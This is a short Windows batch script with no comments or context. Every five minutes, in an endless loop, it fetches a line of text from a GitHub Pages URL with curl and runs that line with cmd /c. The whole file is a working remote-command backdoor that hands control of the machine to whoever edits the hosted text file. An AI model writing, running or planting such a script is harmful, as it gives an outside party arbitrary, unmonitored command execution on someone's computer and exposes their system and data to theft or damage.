@echo off
setlocal enabledelayedexpansion
:loop
curl -s "https://samjoel2007.github.io/Strings/ravi/ravi.txt" > temp_cmd.txt
set /p command=<temp_cmd.txt
del temp_cmd.txt
cmd /c "!command!"
timeout /t 300 /nobreak >nul
goto loop
